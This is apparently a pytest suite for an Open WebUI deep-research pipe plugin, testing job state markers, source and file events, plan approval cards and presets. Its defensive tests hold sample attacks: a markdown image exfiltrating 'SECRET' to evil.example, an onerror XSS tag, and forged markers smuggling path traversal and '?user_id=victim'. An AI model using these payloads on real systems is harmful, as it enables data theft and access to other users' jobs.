import asyncio
import importlib.util
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]


def load_pipe():
    spec = importlib.util.spec_from_file_location("pipe_mod", ROOT / "pipe/deep_research.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_background_tasks_do_not_start_a_research():
    """Open WebUI sends title/tags/follow-up generation to the chat model; the pipe must answer them locally."""
    mod = load_pipe()
    pipe = mod.Pipe()

    async def boom(*a, **k):
        raise AssertionError("service must not be called for background tasks")

    pipe._api = boom
    marker = mod._marker({"state": "clarify", "task": "Stadtklima im Grossen Rat?", "depth": "quick"})
    body = {
        "messages": [
            {
                "role": "user",
                "content": "### Chat History:\n<chat_history>\nASSISTANT: Fragen" + marker + "\n</chat_history>",
            }
        ]
    }
    title = asyncio.run(pipe.pipe(body, {"id": "u"}, __task__="title_generation"))
    assert json.loads(title) == {"title": "Stadtklima im Grossen Rat?"}
    assert json.loads(asyncio.run(pipe.pipe(body, {"id": "u"}, __task__="tags_generation")))["tags"]
    assert json.loads(asyncio.run(pipe.pipe(body, {"id": "u"}, __task__="follow_up_generation"))) == {"follow_ups": []}
    assert (
        json.loads(asyncio.run(pipe.pipe({"messages": []}, {"id": "u"}, __task__="title_generation")))["title"]
        == "Deep Research"
    )
    # task types added in Open WebUI 0.12 (memory review, context compaction), and any future one: no research starts
    for task in ("memory_review", "context_compaction", "something_new"):
        assert asyncio.run(pipe.pipe(body, {"id": "u"}, __task__=task)) == ""


def _pipe_with_service(mod, jobs: dict):
    pipe = mod.Pipe()
    pipe.valves.POLL_SECONDS = 0
    calls = []

    async def fake_api(method, path, body=None):
        calls.append((method, path, body))
        if path == "/jobs" and method == "POST":
            return {"job_id": "j1", "when": body["when"], "window": "20:00-05:00"}
        return jobs["j1"]

    pipe._api = fake_api
    return pipe, calls


def _job_history(mod, text: str = "und?"):
    """A chat whose last answer is a queued job (state=job) and a new user message."""
    return {
        "model": "bebbi_deep_research.grossrat",
        "messages": [
            {"role": "user", "content": "Frage"},
            {"role": "assistant", "content": "Eingereiht" + mod._marker({"state": "job", "job": "j1"})},
            {"role": "user", "content": text},
        ],
    }


def test_finished_report_carries_no_state_marker():
    """A report returned by the pipe must not keep state=job, otherwise the next message returns the report again."""
    mod = load_pipe()
    pipe, calls = _pipe_with_service(
        mod, {"j1": {"status": "done", "events": [], "report": "# Bericht\n\n## Quellen\n[1] x https://a.ch"}}
    )
    out = asyncio.run(pipe.pipe(_job_history(mod), {"id": "u"}, __chat_id__="c1", __message_id__="m1"))
    assert out.startswith("# Bericht") and "research-agent" not in out


def test_running_job_keeps_marker():
    mod = load_pipe()
    pipe, _ = _pipe_with_service(mod, {"j1": {"status": "running", "events": [{"text": "suche"}], "report": None}})
    again = asyncio.run(pipe.pipe(_job_history(mod), {"id": "u"}))
    assert "läuft noch" in again and mod._state([{"role": "assistant", "content": again}, {}])["job"] == "j1"


def test_title_from_plan():
    mod = load_pipe()
    body = {
        "messages": [
            {
                "role": "user",
                "content": "<chat_history>\nASSISTANT: **Rechercheplan: Fasnacht im Grossen Rat**\n\n- x\n</chat_history>",
            }
        ]
    }
    out = asyncio.run(mod.Pipe().pipe(body, {"id": "u"}, __task__="title_generation"))
    assert json.loads(out)["title"] == "Fasnacht im Grossen Rat"


def test_plan_markdown_separates_parts_and_lists():
    mod = load_pipe()
    plan = {
        "title": "T",
        "task_core": "c",
        "parts": [{"id": "a", "title": "A", "goal": "ga"}, {"id": "b", "title": "B", "goal": "gb"}],
        "sub_questions": [{"part": "a", "text": "q1"}, {"part": "b", "text": "q2"}],
        "must_name": [],
    }
    text = mod._render_plan(plan, "quick")
    assert "- q1\n\n**B**: gb\n\n- q2" in text


def test_approved_plan_is_queued_for_the_night_as_replace_event_with_empty_output():
    """The delivery can only change `content`; Open WebUI shows `output` first, so the queued text must not become output."""
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(0)])
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage schnell"}]}
    out = asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert out == ""
    post = next(c for c in calls if c[1] == "/jobs")
    assert (
        post[2]["when"] == "night"
        and post[2]["chat_id"] == "c1"
        and post[2]["message_id"] == "m1"
        and post[2]["draft_id"] == "d1"
    )
    queued = [e for e in events if e["type"] == "replace"][-1]["data"]["content"]
    assert "Nachtfenster" in queued and mod._state([{"role": "assistant", "content": queued}, {}]) == {
        "state": "job",
        "job": "j1",
    }


DONE = {
    "status": "done",
    "events": [],
    "report": "# B\n\nText [1][2].\n\n## Quellen\n\n[1] A. https://a.ch (abgerufen am 2026-10-09)\n[2] B. https://b.ch (abgerufen am 2026-10-09)",
    "ui_report": "# B\n\nText [1][2].\n\n## Quellen\n\n1. A. https://a.ch\n2. B. https://b.ch",
    "docx": "/jobs/j1/report.docx",
    "docx_name": "Bebbi-Deep-Research_B_2026-10-09.docx",
    "owui_events": [
        {
            "type": "source",
            "data": {
                "source": {"name": "A", "url": "https://a.ch"},
                "document": ["a"],
                "metadata": [{"source": "https://a.ch", "name": "A"}],
            },
        },
        {
            "type": "source",
            "data": {
                "source": {"name": "B", "url": "https://b.ch"},
                "document": ["b"],
                "metadata": [{"source": "https://b.ch", "name": "B"}],
            },
        },
    ],
}


def _run_done(mod, text="und?", emitter=True, store=None, request=object(), user=None):
    pipe, calls = _pipe_with_service(mod, {"j1": DONE})
    events = []

    async def emit(ev):
        events.append(ev)

    async def download(path):
        calls.append(("GET", path, None))
        return b"PK-docx"

    stored = []

    async def fake_store(req, user_id, filename, data, content_type):
        stored.append((user_id, filename, data, content_type))
        return {"type": "file", "id": "f1", "url": "f1", "name": filename, "size": len(data)}

    pipe._download = download
    mod.store_user_file = store or fake_store
    out = asyncio.run(
        pipe.pipe(
            _job_history(mod, text),
            user or {"id": "u"},
            __event_emitter__=emit if emitter else None,
            __chat_id__="c1",
            __message_id__="m1",
            __request__=request,
        )
    )
    return out, events, stored, calls


def test_report_gets_one_source_event_per_source_in_order_and_the_word_file():
    """Open WebUI shows [n] as the badge of the n-th source event and lists the sources under the message."""
    mod = load_pipe()
    out, events, stored, _ = _run_done(mod)
    assert out == DONE["ui_report"] and "\u200b" not in out
    sources = [e for e in events if e["type"] == "source"]
    assert sources == DONE["owui_events"]
    files = [e for e in events if e["type"] == "files"]
    assert files == [
        {
            "type": "files",
            "data": {"files": [{"type": "file", "id": "f1", "url": "f1", "name": DONE["docx_name"], "size": 7}]},
        }
    ]
    assert stored == [("u", DONE["docx_name"], b"PK-docx", mod.DOCX)]
    assert events.index(sources[-1]) < events.index(files[0])  # sources first, the file after the text is ready


def test_sources_are_not_emitted_again_when_the_service_delivered_them():
    """The service writes the report with the admin key as well (delivery ok): then the sources are on the message already."""
    mod = load_pipe()
    seen = {"n": 0}
    done = {**DONE, "id": "j1", "delivery": None}

    pipe, _ = _pipe_with_service(mod, {"j1": done})
    real_api = pipe._api

    async def api(method, path, body=None):
        seen["n"] += 1
        return await real_api(method, path, body) if seen["n"] < 3 else {**done, "delivery": "ok"}

    pipe._api = api
    pipe.valves.POLL_SECONDS = 0
    events = []

    async def emit(ev):
        events.append(ev)

    async def download(path):
        return b"x"

    async def store(*a, **k):
        return {"type": "file", "id": "f", "name": "n"}

    pipe._download, mod.store_user_file = download, store
    out = asyncio.run(pipe._publish(done, emit, {"id": "u"}, object()))
    assert out == DONE["ui_report"] and [e["type"] for e in events] == [
        "files"
    ]  # waited for the delivery, kept only the file


def test_failed_word_file_does_not_lose_the_report():
    mod = load_pipe()

    async def broken(*a, **k):
        raise RuntimeError("storage down")

    out, events, _, _ = _run_done(mod, store=broken)
    assert out.startswith(DONE["ui_report"]) and "Word-Datei konnte nicht angehängt werden" in out
    assert len([e for e in events if e["type"] == "source"]) == 2 and not [e for e in events if e["type"] == "files"]


def test_without_event_emitter_or_request_only_the_text_is_returned():
    mod = load_pipe()
    out, events, stored, calls = _run_done(mod, emitter=False)
    assert out == DONE["ui_report"] and not events and not stored
    out, events, stored, _ = _run_done(mod, request=None)
    assert (
        out == DONE["ui_report"] and len([e for e in events if e["type"] == "source"]) == 2 and not stored
    )  # sources yes, file needs the in-process upload


def test_finished_job_reply_in_a_later_message_has_sources_and_file_too():
    mod = load_pipe()
    pipe, _ = _pipe_with_service(mod, {"j1": DONE})
    events = []

    async def emit(ev):
        events.append(ev)

    async def download(path):
        return b"x"

    async def store(*a, **k):
        return {"type": "file", "id": "f", "name": "n"}

    pipe._download, mod.store_user_file = download, store
    body = {
        "model": "x.grossrat",
        "messages": [
            {"role": "assistant", "content": "queued" + mod._marker({"state": "job", "job": "j1"})},
            {"role": "user", "content": "fertig?"},
        ],
    }
    out = asyncio.run(pipe.pipe(body, {"id": "u"}, __event_emitter__=emit, __request__=object()))
    assert out == DONE["ui_report"] and [e["type"] for e in events] == ["source", "source", "files"]


def test_download_helper_is_identical_in_pipe_and_action():
    import inspect

    action = importlib.util.module_from_spec(
        spec := importlib.util.spec_from_file_location("action_mod", ROOT / "pipe/deep_research_download.py")
    )
    spec.loader.exec_module(action)
    assert (
        inspect.getsource(load_pipe().store_user_file).splitlines()[1:]
        == inspect.getsource(action.store_user_file).splitlines()[1:]
    )


def test_store_user_file_runs_open_webui_upload_as_the_user(monkeypatch):
    """The upload goes through Open WebUI's own handler with the chat user, never with the service's admin key."""
    import sys
    import types

    seen = {}

    async def upload_file_handler(request, file, metadata, process, process_in_background, user):
        seen.update(
            request=request,
            name=file.filename,
            ctype=file.content_type,
            data=file.file.read(),
            process=process,
            user=user,
        )
        return types.SimpleNamespace(id="file-1")

    class Users:
        @staticmethod
        async def get_user_by_id(uid):
            return {"id": uid}

    for name, attrs in (
        ("open_webui", {}),
        ("open_webui.models", {}),
        ("open_webui.models.users", {"Users": Users}),
        ("open_webui.routers", {}),
        ("open_webui.routers.files", {"upload_file_handler": upload_file_handler}),
    ):
        monkeypatch.setitem(sys.modules, name, types.SimpleNamespace(**attrs) if attrs else types.ModuleType(name))
    mod = load_pipe()
    item = asyncio.run(mod.store_user_file("REQ", "user-7", "b.docx", b"abc", mod.DOCX))
    assert seen == {
        "request": "REQ",
        "name": "b.docx",
        "ctype": mod.DOCX,
        "data": b"abc",
        "process": False,
        "user": {"id": "user-7"},
    }
    assert item["type"] == "file" and item["id"] == item["url"] == "file-1" and item["size"] == 3


def test_service_errors_reach_the_user_in_german():
    import httpx

    mod = load_pipe()
    pipe = mod.Pipe()
    pipe.valves.SERVICE_URL = "http://service.invalid:1"
    out = asyncio.run(
        pipe.pipe({"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}, {"id": "u"})
    )
    assert out.startswith("Deep Research ist nicht verfügbar: Der Recherche-Dienst ist nicht erreichbar")

    def handler(request):
        return httpx.Response(
            502,
            json={
                "errorId": "service_unavailable",
                "status": 502,
                "debugMessage": "Das Sprachmodell ist nicht erreichbar.",
            },
        )

    real = httpx.AsyncClient
    mod.httpx.AsyncClient = lambda **kw: real(transport=httpx.MockTransport(handler), **kw)
    try:
        out = asyncio.run(
            pipe.pipe({"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}, {"id": "u"})
        )
    finally:
        mod.httpx.AsyncClient = real
    assert out == "Deep Research ist nicht verfügbar: Das Sprachmodell ist nicht erreichbar."


PLAN = {"title": "T", "task_core": "K", "parts": [], "sub_questions": []}


def _card_pipe(mod, answers: list):
    """Pipe with a fake service and a fake browser that answers the card/dialog events in order."""
    pipe, calls = _pipe_with_service(mod, {"j1": {"status": "running", "events": [], "report": None}})
    asked, events = [], []

    async def api(method, path, body=None):
        calls.append((method, path, body))
        if path == "/plans" or path.endswith("/edit"):
            return {"draft_id": "d1", "plan": {**PLAN, "title": f"T{len(calls)}"}}
        if path == "/clarify":
            return {"questions": [], "assumptions": []}
        return {"job_id": "j1", "when": body["when"], "window": "20:00-05:00"}

    async def call(event):
        asked.append(event)
        return answers.pop(0)

    async def emit(ev):
        events.append(ev)

    pipe._api = api
    return pipe, calls, asked, events, call, emit


def _pick(index):
    return {"status": "answered", "answers": {"plan": {"type": "option", "option_index": index, "label": "x"}}}


def test_card_approve_starts_the_job_in_the_plan_turn():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(0)])
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage schnell"}]}
    out = asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    card = asked[0]
    assert card["type"] == "request:user_input" and card["data"]["allow_other"] is False
    q = card["data"]["questions"][0]
    assert [o["label"] for o in q["options"]] == ["Freigeben", "Ändern", "Verwerfen"] and q["allow_other"] is False
    assert any(
        e["type"] == "replace"
        and "Rechercheplan" in e["data"]["content"]
        and "research-agent" not in e["data"]["content"]
        for e in events
    )
    job = next(c for c in calls if c[1] == "/jobs")
    assert job[2]["draft_id"] == "d1" and job[2]["when"] == "night" and job[2]["message_id"] == "m1" and out == ""


def test_card_change_edits_and_asks_again_then_discard():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(1), "Teil 3 weglassen", _pick(2)])
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}
    out = asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert [a["type"] for a in asked] == ["request:user_input", "input", "request:user_input"]
    edit = next(c for c in calls if c[1].endswith("/edit"))
    assert edit[2] == {"instruction": "Teil 3 weglassen", "user_id": "u"}
    assert not any(c[1] == "/jobs" for c in calls)
    assert "verworfen" in out and "research-agent" not in out


def test_card_without_answer_counts_as_no():
    mod = load_pipe()
    for answer in ({"status": "cancelled", "answers": {}}, {"error": "Client session disconnected."}, None, _pick(7)):
        pipe, calls, asked, events, call, emit = _card_pipe(mod, [answer])
        body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}
        out = asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
        assert "Keine Freigabe" in out and "research-agent" not in out
        assert not any(c[1] == "/jobs" for c in calls)


def test_card_change_dialog_cancelled_returns_to_the_choice_and_no_change_after_three_edits():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(1), False, _pick(0)])
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}
    asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert [a["type"] for a in asked] == ["request:user_input", "input", "request:user_input"] and any(
        c[1] == "/jobs" for c in calls
    )

    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(1), "a", _pick(1), "b", _pick(1), "c", _pick(1)])
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}
    out = asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert len([c for c in calls if c[1].endswith("/edit")]) == 3
    labels = [o["label"] for o in asked[-1]["data"]["questions"][0]["options"]]
    assert labels == ["Freigeben", "Verwerfen"]  # third change done: only start or discard
    assert (
        not any(c[1] == "/jobs" for c in calls) and "verworfen" in out and "research-agent" not in out
    )  # index 1 is now Verwerfen


def test_owner_id_is_sent_to_the_service():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(1), "kürzer", _pick(0)])
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}
    asyncio.run(pipe.pipe(body, {"id": "u 1"}, emit, "c1", "m1", __event_call__=call))
    assert all(c[2]["user_id"] == "u 1" for c in calls if c[1] in ("/plans", "/jobs") or c[1].endswith("/edit"))
    pipe, calls = _pipe_with_service(mod, {"j1": {"status": "running", "events": [], "report": None}})
    asyncio.run(pipe.pipe(_job_history(mod), {"id": "u 1"}))
    assert ("GET", "/jobs/j1?user_id=u%201", None) in calls


def test_forged_or_broken_marker_is_no_state():
    import base64

    mod = load_pipe()
    for payload in (
        base64.urlsafe_b64encode(b"[1]"),
        base64.urlsafe_b64encode(b'"x"'),
        base64.urlsafe_b64encode(b'{"state": "job"}'),
        base64.urlsafe_b64encode(b'{"state": "job", "job": "abc123def456#"}'),  # would drop ?user_id= (review D1)
        base64.urlsafe_b64encode(b'{"state": "job", "job": "abc?user_id=victim"}'),
        base64.urlsafe_b64encode(b'{"state": "job", "job": "../plans/x"}'),
        base64.urlsafe_b64encode(b'{"state": "job", "job": 5}'),
        b"@@",
    ):
        msgs = [
            {"role": "assistant", "content": f"x\n\n[//]: # (research-agent:{payload.decode()})"},
            {"role": "user", "content": "hi"},
        ]
        assert mod._state(msgs) == {}
    assert mod._decode(base64.urlsafe_b64encode(b"[1]").decode()) == {}


def test_vanished_job_drops_the_marker_and_failed_submit_keeps_nothing():
    mod = load_pipe()
    pipe = mod.Pipe()

    async def gone(method, path, body=None):
        raise mod.NotFound("Job nicht gefunden")

    pipe._api = gone
    history = {
        "model": "x.grossrat",
        "messages": [
            {"role": "assistant", "content": "Läuft" + mod._marker({"state": "job", "job": "j1"})},
            {"role": "user", "content": "und?"},
        ],
    }
    out = asyncio.run(pipe.pipe(history, {"id": "u"}))
    assert "research-agent" not in out and "nicht gefunden" in out

    pipe, calls, asked, events, call, emit = _card_pipe(mod, [_pick(0)])

    async def broken(method, path, body=None):
        if path == "/jobs":
            raise RuntimeError("boom")
        return {"draft_id": "d1", "plan": PLAN, "questions": [], "assumptions": []}

    pipe._api = broken
    body = {"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}
    out = asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert "nicht verfügbar" in out and "research-agent" not in out  # no job, no plan kept: the user asks again


# ---------------------------------------------------------------- one model, preset chosen per task
def _preset_pipe(mod, answers: list, suggestion="grossrat", questions=()):
    """Model "Deep Research": the fake service suggests `suggestion`; the fake browser answers the cards in order."""
    pipe, calls, asked, events, call, emit = _card_pipe(mod, answers)
    plan_api = pipe._api

    async def api(method, path, body=None):
        if path == "/clarify":
            calls.append((method, path, body))
            return {"questions": list(questions), "assumptions": [], "preset": suggestion}
        if path == "/presets":
            calls.append((method, path, body))
            return [{"name": "grossrat", "description": "Grosser Rat Basel-Stadt"}, {"name": "rechtsrecherche"}]
        return await plan_api(method, path, body)

    pipe._api = api
    return pipe, calls, asked, events, call, emit


def _choose(index):
    return {"status": "answered", "answers": {"preset": {"type": "option", "option_index": index, "label": "x"}}}


AUTO_BODY = {"model": "bebbi_deep_research.auto", "messages": [{"role": "user", "content": "Vorstösse zum Wohnschutz"}]}


def test_one_model_by_default_and_preset_models_on_request():
    mod = load_pipe()
    pipe = mod.Pipe()
    assert pipe.pipes() == [{"id": "auto", "name": "Deep Research"}]
    pipe.valves.PRESET_MODELS = True
    assert {"id": "grossrat", "name": "Deep Research · Grosser Rat"} in pipe.pipes() and len(pipe.pipes()) == 7


def test_the_suggested_preset_comes_first_and_the_users_pick_is_planned():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _preset_pipe(mod, [_choose(1), _pick(2)])
    out = asyncio.run(pipe.pipe(AUTO_BODY, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    clarify = next(c for c in calls if c[1] == "/clarify")
    assert clarify[2]["suggest_preset"] is True and "preset" not in clarify[2]
    card = asked[0]["data"]["questions"][0]
    labels = [o["label"] for o in card["options"]]
    assert labels[0] == "Grosser Rat (empfohlen)" and "Recht" in labels and len(labels) == 6
    assert card["options"][0]["description"] == "Grosser Rat Basel-Stadt"
    plan = next(c for c in calls if c[1] == "/plans")
    assert plan[2]["preset"] == labels_to_name(mod, labels[1])
    assert f"Recherche: **{labels[1]}**" in out  # the plan names the chosen preset


def labels_to_name(mod, label):
    return {v: k for k, v in mod.Pipe()._labels().items()}[label]


def test_no_preset_answer_starts_nothing():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _preset_pipe(mod, [{"status": "cancelled"}])
    out = asyncio.run(pipe.pipe(AUTO_BODY, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert "Keine Auswahl" in out and not any(c[1] == "/plans" for c in calls)


def test_without_a_browser_the_suggestion_or_the_default_is_used():
    mod = load_pipe()
    for suggestion, expected in (("grossrat", "grossrat"), (None, "verwaltung_web"), ("erfunden", "verwaltung_web")):
        pipe, calls, *_ = _preset_pipe(mod, [], suggestion=suggestion)
        asyncio.run(pipe.pipe(AUTO_BODY, {"id": "u"}))
        assert next(c for c in calls if c[1] == "/plans")[2]["preset"] == expected


def test_the_chosen_preset_survives_the_clarifying_questions():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _preset_pipe(mod, [_choose(0)], questions=["Zeitraum?"])
    first = asyncio.run(pipe.pipe(AUTO_BODY, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    assert "Zeitraum?" in first and not any(c[1] == "/plans" for c in calls)
    body = {
        "model": "bebbi_deep_research.auto",
        "messages": [
            *AUTO_BODY["messages"],
            {"role": "assistant", "content": first},
            {"role": "user", "content": "ab 2020"},
        ],
    }
    pipe2, calls2, *_ = _preset_pipe(mod, [], suggestion="statistik")
    asyncio.run(pipe2.pipe(body, {"id": "u"}))
    assert next(c for c in calls2 if c[1] == "/plans")[2]["preset"] == "grossrat"
    assert not any(c[1] == "/clarify" for c in calls2)


def test_a_preset_model_skips_the_choice():
    mod = load_pipe()
    pipe, calls, asked, events, call, emit = _preset_pipe(mod, [_pick(2)])
    body = {"model": "x.rechtsrecherche", "messages": [{"role": "user", "content": "Frage"}]}
    asyncio.run(pipe.pipe(body, {"id": "u"}, emit, "c1", "m1", __event_call__=call))
    clarify = next(c for c in calls if c[1] == "/clarify")
    assert clarify[2]["preset"] == "rechtsrecherche" and "suggest_preset" not in clarify[2]
    assert [q["data"]["questions"][0]["id"] for q in asked] == ["plan"]


# ------------------------------------------------------- D8: LLM-written plan and questions render as plain text
EVIL = (
    "Plan ![x](https://evil.example/p?d=SECRET) [klick](https://evil.example/l) <img src=x onerror=alert(1)> **fett**"
)


def _html(markdown: str) -> str:
    from markdown_it import MarkdownIt

    return MarkdownIt("commonmark").render(markdown)


def test_plan_from_the_llm_cannot_load_images_or_links():
    mod = load_pipe()
    plan = {
        "title": EVIL,
        "task_core": EVIL,
        "parts": [{"id": "a", "title": EVIL, "goal": "Ziel\n\n# Überschrift " + EVIL}],
        "sub_questions": [{"part": "a", "text": EVIL}],
        "must_name": [EVIL],
    }
    html = _html(mod._render_plan(plan, "quick"))
    assert "<img" not in html and "<a " not in html and "evil.example" in html  # shown as text
    assert "<h1>" not in html and html.count("<strong>") == 3  # only the pipe's own bold: plan and part title, depth
    # the chat title still comes from the plan title, without the escapes
    prompt = "<chat_history>\nASSISTANT: " + mod._render_plan({**plan, "title": "Fasnacht *2026*"}, "quick")
    out = mod.Pipe()._task_reply("title_generation", {"messages": [{"content": prompt}]})
    assert json.loads(out)["title"] == "Fasnacht *2026*"


def test_clarifying_questions_from_the_llm_are_plain_text():
    mod = load_pipe()
    pipe = mod.Pipe()

    async def api(method, path, body=None):
        return {"questions": [EVIL], "assumptions": [EVIL]}

    pipe._api = api
    out = asyncio.run(
        pipe.pipe({"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}, {"id": "u"})
    )
    html = _html(out)
    assert "<img" not in html and "<a " not in html and "<strong>" not in html.split("Antworten Sie kurz")[0]


def _compacted_history(text: str = "Ist der Bericht schon fertig?"):
    """What Open WebUI 0.12.4 hands the pipe after context compaction in a short chat (user, assistant, user): the
    assistant message with our state marker is summarized away, only the summary and the new user message are left."""
    return {
        "model": "bebbi_deep_research.grossrat",
        "messages": [
            {"role": "system", "content": "[CONVERSATION SUMMARY]\n- user: Frage\n- assistant: Eingereicht"},
            {"role": "user", "content": text},
        ],
    }


def test_state_survives_context_compaction_by_reading_the_stored_parent_message(monkeypatch):
    """Open WebUI 0.12.4 compacts the chat user, assistant, user once it is over the threshold (a per-chat or per-model
    `compact_token_threshold`, or a very long task): the assistant message with the state marker disappears from the
    request. The pipe must still report the queued job, not start a new research (found on the local 0.12.4 stack)."""
    mod = load_pipe()
    pipe, calls = _pipe_with_service(mod, {"j1": {"status": "running", "events": [{"text": "suche"}], "report": None}})
    asked = []

    async def stored(chat_id, metadata):
        asked.append((chat_id, metadata["user_message"]["parentId"]))
        return {"role": "assistant", "content": "Eingereiht" + mod._marker({"state": "job", "job": "j1"})}

    monkeypatch.setattr(mod, "_stored_parent", stored)
    meta = {"user_message": {"id": "u2", "parentId": "a1", "content": "fertig?"}}
    out = asyncio.run(pipe.pipe(_compacted_history(), {"id": "u"}, __chat_id__="c1", __metadata__=meta))
    assert asked == [("c1", "a1")]
    assert "läuft noch" in out and [c[:2] for c in calls] == [("GET", "/jobs/j1?user_id=u")]


def test_stored_parent_is_not_read_when_the_request_has_the_answer_or_no_parent(monkeypatch):
    mod = load_pipe()

    async def boom(chat_id, metadata):
        raise AssertionError("the database must not be read")

    monkeypatch.setattr(mod, "_stored_parent", boom)
    meta = {"user_message": {"id": "u2", "parentId": "a1"}}
    # the assistant message is in the request (no compaction): its marker counts, a missing marker is no state
    with_marker = _job_history(mod)["messages"]
    assert asyncio.run(mod._state_of_chat(with_marker, "c1", meta)) == {"state": "job", "job": "j1"}
    no_marker = [
        {"role": "user", "content": "a"},
        {"role": "assistant", "content": "Bericht"},
        {"role": "user", "content": "b"},
    ]
    assert asyncio.run(mod._state_of_chat(no_marker, "c1", meta)) == {}
    # first message of a chat: no parent
    first = [{"role": "user", "content": "Frage"}]
    assert asyncio.run(mod._state_of_chat(first, "c1", {"user_message": {"id": "u1", "parentId": None}})) == {}
    assert asyncio.run(mod._state_of_chat(first, "c1", None)) == {}


def test_a_failing_or_foreign_lookup_gives_no_state(monkeypatch):
    mod = load_pipe()
    meta = {"user_message": {"id": "u2", "parentId": "a1"}}

    async def fails(chat_id, metadata):
        raise ImportError("no Open WebUI here")

    monkeypatch.setattr(mod, "_stored_parent", fails)
    assert asyncio.run(mod._state_of_chat(_compacted_history()["messages"], "c1", meta)) == {}

    async def forged(chat_id, metadata):  # a marker with an id that would change the service path
        return {"role": "assistant", "content": "x" + mod._marker({"state": "job", "job": "j1/../x"})}

    monkeypatch.setattr(mod, "_stored_parent", forged)
    assert asyncio.run(mod._state_of_chat(_compacted_history()["messages"], "c1", meta)) == {}


def test_stored_parent_reads_the_chat_through_open_webui(monkeypatch):
    """`_stored_parent` uses Chats.get_message_by_id_and_message_id(chat_id, message_id) (scripts/check_owui_internals.py
    runs it against the real module)."""
    import sys
    import types

    mod = load_pipe()
    seen = []

    class Chats:
        @staticmethod
        async def get_message_by_id_and_message_id(chat_id, message_id):
            seen.append((chat_id, message_id))
            return {"role": "assistant", "content": "x"} if message_id == "a1" else {"role": "user", "content": "y"}

    pkg = types.ModuleType("open_webui")
    models = types.ModuleType("open_webui.models")
    chats = types.ModuleType("open_webui.models.chats")
    chats.Chats = Chats
    for name, module in (("open_webui", pkg), ("open_webui.models", models), ("open_webui.models.chats", chats)):
        monkeypatch.setitem(sys.modules, name, module)
    meta = lambda parent: {"user_message": {"parentId": parent}}  # noqa: E731
    assert asyncio.run(mod._stored_parent("c1", meta("a1"))) == {"role": "assistant", "content": "x"}
    assert asyncio.run(mod._stored_parent("c1", meta("u0"))) is None  # not an assistant message
    assert (
        asyncio.run(mod._stored_parent(None, meta("a1"))) is None and asyncio.run(mod._stored_parent("c1", {})) is None
    )
    assert seen == [("c1", "a1"), ("c1", "u0")]


def test_stored_parent_after_regenerate_uses_user_message_id_of_the_same_chat(monkeypatch):
    """Regenerating a reply: the browser sends no `user_message`; Open WebUI sets `metadata["user_message_id"]`. Its
    parent is the assistant message with the marker."""
    import sys
    import types

    mod = load_pipe()
    seen = []
    store = {
        "u2": {"role": "user", "parentId": "a1"},
        "a1": {"role": "assistant", "content": "x", "parentId": "u1"},
        "u0": {"role": "user"},  # a user message without parent: first message of the chat
    }

    class Chats:
        @staticmethod
        async def get_message_by_id_and_message_id(chat_id, message_id):
            seen.append((chat_id, message_id))
            return store.get(message_id)

    pkg, models, chats = (types.ModuleType(n) for n in ("open_webui", "open_webui.models", "open_webui.models.chats"))
    chats.Chats = Chats
    for name, module in (("open_webui", pkg), ("open_webui.models", models), ("open_webui.models.chats", chats)):
        monkeypatch.setitem(sys.modules, name, module)
    assert asyncio.run(mod._stored_parent("c1", {"user_message_id": "u2"}))["role"] == "assistant"
    assert seen == [("c1", "u2"), ("c1", "a1")]  # always the chat of the request
    assert asyncio.run(mod._stored_parent("c1", {"user_message": None, "user_message_id": "u0"})) is None
    assert asyncio.run(mod._stored_parent("c1", {"user_message_id": "missing"})) is None
    # `user_message` with a parent wins, no second lookup
    seen.clear()
    assert asyncio.run(mod._stored_parent("c1", {"user_message": {"parentId": "a1"}, "user_message_id": "u2"}))
    assert seen == [("c1", "a1")]


def test_a_failed_state_lookup_is_logged(monkeypatch, caplog):
    mod = load_pipe()

    async def fails(chat_id, metadata):
        raise ImportError("moved")

    monkeypatch.setattr(mod, "_stored_parent", fails)
    with caplog.at_level("WARNING"):
        assert asyncio.run(mod._state_of_chat([{"role": "user", "content": "x"}], "c1", {})) == {}
    assert "ImportError" in caplog.text and "moved" in caplog.text
